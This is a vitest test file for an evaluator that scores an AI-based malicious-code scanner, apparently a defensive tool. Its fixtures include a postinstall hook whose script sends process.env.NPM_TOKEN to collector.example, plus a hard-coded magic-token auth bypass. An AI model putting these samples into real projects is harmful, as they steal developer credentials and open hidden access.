import { mkdtemp, mkdir, rm, symlink, writeFile } from 'fs/promises';
import { tmpdir } from 'os';
import { join } from 'path';
import { describe, expect, it } from 'vitest';

interface TestEvaluationResult {
  id: string;
  expectedRuleIds: string[];
  actualRuleIds: string[];
  passed: boolean;
  malformed: boolean;
  expectedFindings?: Array<{ file: string; ruleId: string }>;
  actualFindings?: Array<{ file: string; ruleId: string }>;
  error?: string;
}

interface TestMetrics {
  truePositives: number;
  falsePositives: number;
  falseNegatives: number;
  precision: number;
  recall: number;
  f1: number;
}

interface TestScore {
  aggregate: TestMetrics;
  perRule: Record<string, TestMetrics>;
  passed: number;
  total: number;
  malformed: number;
  errors: number;
}

const loadEvaluatorModule = async () => {
  const moduleUrl = new URL('../../scripts/evaluate-spectre.ts', import.meta.url);
  return await import(moduleUrl.href) as {
    createEvaluationResult(
      test: { id: string; expectedRuleIds: string[] },
      actualRuleIds: string[],
      options?: {
        malformed?: boolean;
        error?: string;
        expectedFindings?: Array<{ file: string; ruleId: string }>;
        actualFindings?: Array<{ file: string; ruleId: string }>;
      },
    ): TestEvaluationResult;
    scoreSpectreEvaluation(results: TestEvaluationResult[]): TestScore;
    evaluateSpectreThresholds(
      score: TestScore,
      thresholds: Record<string, number>,
    ): string[];
    parseEvaluationResponse(responseText: string, expectedFile: string | string[], contentByFile?: ReadonlyMap<string, string>): {
      actualRuleIds: string[];
      actualFindings: Array<{ file: string; ruleId: string }>;
      malformed: boolean;
    };
    evaluationFiles(test: { id: string; file?: string; content?: string; files?: Array<{ file: string; content?: string }> }): Array<{ file: string; content?: string }>;
    resolveEvaluationFiles(
      test: { id: string; file?: string; content?: string; files?: Array<{ file: string; content?: string }> },
      sourceRoot?: string,
    ): Promise<Array<{ file: string; content: string }>>;
    buildEvaluationCasePrompt(
      test: { id: string; file?: string; content?: string; files?: Array<{ file: string; content?: string }>; expectedRuleIds: string[] },
      files: Array<{ file: string; content: string }>,
      systemPrompt: string,
    ): string;
    runProductionEvaluationCase(
      test: {
        id: string;
        files: Array<{ file: string; content: string }>;
        expectedRuleIds: string[];
        expectedFindings: Array<{ file: string; ruleId: string }>;
        maxDiffLines?: number;
        routing?: { fileCap?: number; secondaryFileCap?: number };
      },
      files: Array<{ file: string; content: string }>,
      config: Record<string, unknown>,
      transport: { complete(request: { key: string }): Promise<{ text: string }> },
    ): Promise<{
      actualRuleIds: string[];
      expectedFindings: Array<{ file: string; ruleId: string }>;
      actualFindings: Array<{ file: string; ruleId: string }>;
      malformed: boolean;
      routing: { selectedCount: number };
    }>;
    resolveEvaluationContent(test: { id: string; file: string; content?: string }, sourceRoot?: string): Promise<string>;
    extractClaudeResponse(stdout: string): string;
    assertManualSpectreEvaluation(env: NodeJS.ProcessEnv): void;
  };
};

describe('Spectre semantic evaluator scoring', () => {
  it('reports aggregate and per-rule precision, recall, F1, FP and FN', async () => {
    const { createEvaluationResult, scoreSpectreEvaluation } = await loadEvaluatorModule();
    const results = [
      createEvaluationResult(
        { id: 'detected', expectedRuleIds: ['spectre/backdoor', 'credential-exfiltration'] },
        ['backdoor', 'backdoor'],
      ),
      createEvaluationResult(
        { id: 'false-positive', expectedRuleIds: [] },
        ['reverse-shell'],
      ),
      createEvaluationResult(
        { id: 'error', expectedRuleIds: ['supply-chain-abuse'] },
        [],
        { error: 'provider unavailable' },
      ),
      createEvaluationResult(
        { id: 'malformed', expectedRuleIds: [] },
        [],
        { malformed: true },
      ),
    ];

    const score = scoreSpectreEvaluation(results);

    expect(score.aggregate).toEqual({
      truePositives: 1,
      falsePositives: 1,
      falseNegatives: 2,
      precision: 0.5,
      recall: 1 / 3,
      f1: 0.4,
    });
    expect(score.perRule['backdoor']).toMatchObject({
      truePositives: 1,
      falsePositives: 0,
      falseNegatives: 0,
      precision: 1,
      recall: 1,
      f1: 1,
    });
    expect(score.perRule['credential-exfiltration']).toMatchObject({ falseNegatives: 1 });
    expect(score.perRule['reverse-shell']).toMatchObject({ falsePositives: 1 });
    expect(score).toMatchObject({ passed: 0, total: 4, malformed: 1, errors: 1 });
  });

  it('scores same-rule findings on the wrong file as both a false positive and false negative', async () => {
    const { createEvaluationResult, scoreSpectreEvaluation } = await loadEvaluatorModule();
    const result = createEvaluationResult(
      { id: 'wrong-file', expectedRuleIds: ['credential-exfiltration'] },
      ['credential-exfiltration'],
      {
        expectedFindings: [{ file: 'src/expected.ts', ruleId: 'credential-exfiltration' }],
        actualFindings: [{ file: 'src/other.ts', ruleId: 'credential-exfiltration' }],
      },
    );

    expect(result.passed).toBe(false);
    expect(scoreSpectreEvaluation([result]).aggregate).toMatchObject({
      truePositives: 0,
      falsePositives: 1,
      falseNegatives: 1,
    });
  });

  it('scores duplicate same-file behaviors as a multiset', async () => {
    const { createEvaluationResult, scoreSpectreEvaluation } = await loadEvaluatorModule();
    const result = createEvaluationResult(
      { id: 'duplicate-behavior', expectedRuleIds: ['backdoor'] },
      ['backdoor'],
      {
        expectedFindings: [
          { file: 'src/server.ts', ruleId: 'backdoor' },
          { file: 'src/server.ts', ruleId: 'backdoor' },
        ],
        actualFindings: [{ file: 'src/server.ts', ruleId: 'backdoor' }],
      },
    );

    expect(result.passed).toBe(false);
    expect(scoreSpectreEvaluation([result]).aggregate).toMatchObject({
      truePositives: 1,
      falsePositives: 0,
      falseNegatives: 1,
    });
  });

  it('marks invalid canonical responses malformed while accepting omitted line hints', async () => {
    const { parseEvaluationResponse } = await loadEvaluatorModule();
    const valid = parseEvaluationResponse(JSON.stringify({ findings: [{
      file: 'src/auth.ts',
      severity: 'high',
      ruleId: 'backdoor',
      message: 'Hidden bypass',
      evidence: "if (token === 'magic') return true;",
    }] }), 'src/auth.ts');

    expect(valid).toEqual({
      actualRuleIds: ['backdoor'],
      actualFindings: [{ file: 'src/auth.ts', ruleId: 'backdoor' }],
      malformed: false,
    });
    expect(parseEvaluationResponse('{not-json', 'src/auth.ts')).toEqual({
      actualRuleIds: [],
      actualFindings: [],
      malformed: true,
    });
  });

  it('reads Claude structured output envelopes', async () => {
    const { extractClaudeResponse } = await loadEvaluatorModule();
    expect(extractClaudeResponse(JSON.stringify({ structured_output: { findings: [] } }))).toBe('{"findings":[]}');
  });

  it('builds a multi-file prompt with deterministic routing context', async () => {
    const { buildEvaluationCasePrompt, resolveEvaluationFiles } = await loadEvaluatorModule();
    const test = {
      id: 'split-install-chain',
      files: [
        { file: 'package.json', content: '{"scripts":{"postinstall":"node scripts/install.js"}}\n' },
        { file: 'scripts/install.js', content: "fetch('https://collector.example', {body: process.env.NPM_TOKEN});\n" },
      ],
      expectedRuleIds: ['credential-exfiltration'],
    };
    const files = await resolveEvaluationFiles(test);
    const prompt = buildEvaluationCasePrompt(test, files, 'SYSTEM');

    expect(files.map(file => file.file)).toEqual(['package.json', 'scripts/install.js']);
    expect(prompt).toContain('Review all supplied files together');
    expect(prompt).toContain('manifest-lifecycle');
    expect(prompt).toContain('path:scripts/install.js');
    expect(prompt).toContain('<untrusted-code file="package.json">');
    expect(prompt).toContain('<untrusted-code file="scripts/install.js">');
    expect(prompt).not.toContain('expectedRuleIds');
  });

  it('runs multi-file semantic cases through the production selector and cluster planner', async () => {
    const { resolveEvaluationFiles, runProductionEvaluationCase } = await loadEvaluatorModule();
    const test = {
      id: 'production-routed-chain',
      files: [
        { file: 'package.json', content: '{"scripts":{"postinstall":"node scripts/install.js"}}\n' },
        { file: 'scripts/install.js', content: "fetch('https://collector.example', {body: process.env.NPM_TOKEN});\n" },
        { file: 'src/unrelated.js', content: 'export const unrelated = true;\n' },
      ],
      expectedRuleIds: ['credential-exfiltration'],
      expectedFindings: [{ file: 'scripts/install.js', ruleId: 'credential-exfiltration' }],
      maxDiffLines: 2,
    };
    const files = await resolveEvaluationFiles(test);
    const requests: string[] = [];
    const parsed = await runProductionEvaluationCase(test, files, {
      enabled: true,
      provider: 'anthropic',
      model: 'test-model',
      maxInputBytes: 64 * 1024,
      maxDiffLines: 400,
      maxCallsPerFile: 4,
      maxCallsPerPullRequest: 40,
      concurrency: 2,
      minSeverity: 'high',
    }, {
      complete: async request => {
        requests.push(request.key);
        return request.key === 'cluster:1'
          ? { text: JSON.stringify({ findings: [{
            file: 'scripts/install.js', severity: 'critical', ruleId: 'credential-exfiltration',
            message: 'Exfiltrates an install-time token', evidence: 'process.env.NPM_TOKEN',
          }] }) }
          : { text: '{"findings":[]}' };
      },
    });

    expect(requests).toEqual(['cluster:1', 'file:src/unrelated.js:chunk:1']);
    expect(parsed).toMatchObject({
      actualRuleIds: ['credential-exfiltration'],
      expectedFindings: [{ file: 'scripts/install.js', ruleId: 'credential-exfiltration' }],
      actualFindings: [{ file: 'scripts/install.js', ruleId: 'credential-exfiltration' }],
      malformed: false,
    });
  });

  it('measures evaluator completeness against eligible code rather than prose fixtures', async () => {
    const { resolveEvaluationFiles, runProductionEvaluationCase } = await loadEvaluatorModule();
    const test = {
      id: 'code-with-prose-context',
      files: [
        { file: 'README.md', content: 'AWS Security documentation: https://docs.example.test\n' },
        { file: 'src/app.ts', content: 'export const ready = true;\n' },
      ],
      expectedRuleIds: [],
      expectedFindings: [],
    };
    const files = await resolveEvaluationFiles(test);
    const requests: string[] = [];
    const parsed = await runProductionEvaluationCase(test, files, {
      enabled: true,
      provider: 'anthropic',
      model: 'test-model',
      maxInputBytes: 64 * 1024,
      maxDiffLines: 400,
      maxCallsPerFile: 4,
      maxCallsPerPullRequest: 40,
      concurrency: 2,
      minSeverity: 'high',
    }, {
      complete: async request => {
        requests.push(request.key);
        return { text: '{"findings":[]}' };
      },
    });

    expect(requests).toEqual(['whole-pr']);
    expect(parsed).toMatchObject({ actualRuleIds: [], expectedFindings: [], actualFindings: [], malformed: false });
  });

  it('does not classify an explicit per-case selection cap as a malformed provider response', async () => {
    const { resolveEvaluationFiles, runProductionEvaluationCase } = await loadEvaluatorModule();
    const test = {
      id: 'intentional-selection-cap',
      files: [
        { file: 'src/a.ts', content: 'export const a = true;\n' },
        { file: 'src/b.ts', content: 'export const b = true;\n' },
      ],
      routing: { fileCap: 1, secondaryFileCap: 0 },
      expectedRuleIds: [],
      expectedFindings: [],
    };
    const files = await resolveEvaluationFiles(test);
    const parsed = await runProductionEvaluationCase(test, files, {
      enabled: true,
      provider: 'anthropic',
      model: 'test-model',
      minSeverity: 'high',
    }, {
      complete: async () => ({ text: '{"findings":[]}' }),
    });

    expect(parsed).toMatchObject({ actualRuleIds: [], malformed: false });
    expect(parsed.routing.selectedCount).toBe(1);
  });

  it('accepts findings from multiple allowed files while marking outside paths malformed', async () => {
    const { parseEvaluationResponse } = await loadEvaluatorModule();
    const parsed = parseEvaluationResponse(JSON.stringify({ findings: [
      { file: 'package.json', severity: 'high', ruleId: 'supply-chain-abuse', message: 'Hostile install hook', evidence: '"postinstall":"node scripts/install.js"' },
      { file: 'scripts/install.js', severity: 'critical', ruleId: 'credential-exfiltration', message: 'Exfiltrates token', evidence: 'process.env.NPM_TOKEN' },
      { file: 'outside.js', severity: 'high', ruleId: 'backdoor', message: 'Outside', evidence: 'hidden()' },
    ] }), ['package.json', 'scripts/install.js']);

    expect(parsed).toEqual({
      actualRuleIds: ['credential-exfiltration', 'supply-chain-abuse'],
      actualFindings: [
        { file: 'package.json', ruleId: 'supply-chain-abuse' },
        { file: 'scripts/install.js', ruleId: 'credential-exfiltration' },
      ],
      malformed: true,
    });
  });

  it('discards semantic findings whose evidence would fail production validation', async () => {
    const { parseEvaluationResponse } = await loadEvaluatorModule();
    const parsed = parseEvaluationResponse(JSON.stringify({ findings: [{
      file: 'src/safe.ts', severity: 'high', ruleId: 'backdoor', message: 'Invented behavior', evidence: 'installBackdoor();',
    }] }), 'src/safe.ts', new Map([['src/safe.ts', 'export const safe = true;\n']]));

    expect(parsed).toEqual({ actualRuleIds: [], actualFindings: [], malformed: true });
  });

  it('rejects ambiguous or duplicate evaluation file definitions', async () => {
    const { evaluationFiles } = await loadEvaluatorModule();
    expect(() => evaluationFiles({ id: 'mixed', file: 'a.ts', content: 'a', files: [{ file: 'b.ts', content: 'b' }] })).toThrow('exactly one');
    expect(() => evaluationFiles({ id: 'empty', files: [] })).toThrow('must not be empty');
    expect(() => evaluationFiles({ id: 'duplicate', files: [{ file: 'a.ts' }, { file: 'a.ts' }] })).toThrow('duplicate');
  });

  it('returns failures only for configured thresholds that are missed', async () => {
    const { createEvaluationResult, scoreSpectreEvaluation, evaluateSpectreThresholds } = await loadEvaluatorModule();
    const score = scoreSpectreEvaluation([
      createEvaluationResult({ id: 'miss', expectedRuleIds: ['backdoor'] }, []),
    ]);

    expect(evaluateSpectreThresholds(score, {
      minPrecision: 1,
      minRecall: 0.5,
      maxFalseNegatives: 0,
      maxErrors: 0,
    })).toEqual([
      'recall 0 is below 0.5',
      'false negatives 1 exceed 0',
    ]);
  });

  it('contains SPECTRE_SOURCE_ROOT reads after resolving symlinks', async () => {
    const { resolveEvaluationContent } = await loadEvaluatorModule();
    const root = await mkdtemp(join(tmpdir(), 'layne-evaluator-root-'));
    const outside = await mkdtemp(join(tmpdir(), 'layne-evaluator-outside-'));
    try {
      await mkdir(join(root, 'src'));
      await writeFile(join(root, 'src/safe.ts'), 'safe');
      await writeFile(join(outside, 'secret.ts'), 'secret');
      await symlink(join(outside, 'secret.ts'), join(root, 'src/escape.ts'));

      await expect(resolveEvaluationContent({ id: 'safe', file: 'src/safe.ts' }, root)).resolves.toBe('safe');
      await expect(resolveEvaluationContent({ id: 'absolute', file: join(outside, 'secret.ts') }, root)).rejects.toThrow('invalid source path');
      await expect(resolveEvaluationContent({ id: 'traversal', file: '../secret.ts' }, root)).rejects.toThrow('invalid source path');
      await expect(resolveEvaluationContent({ id: 'symlink', file: 'src/escape.ts' }, root)).rejects.toThrow('escapes SPECTRE_SOURCE_ROOT');
    } finally {
      await Promise.all([
        rm(root, { recursive: true, force: true }),
        rm(outside, { recursive: true, force: true }),
      ]);
    }
  });

  it('keeps the Claude evaluator disabled in CI and tests', async () => {
    const { assertManualSpectreEvaluation } = await loadEvaluatorModule();
    expect(() => assertManualSpectreEvaluation({ CI: 'true' })).toThrow('manual-only');
    expect(() => assertManualSpectreEvaluation({ NODE_ENV: 'test' })).toThrow('manual-only');
  });
});
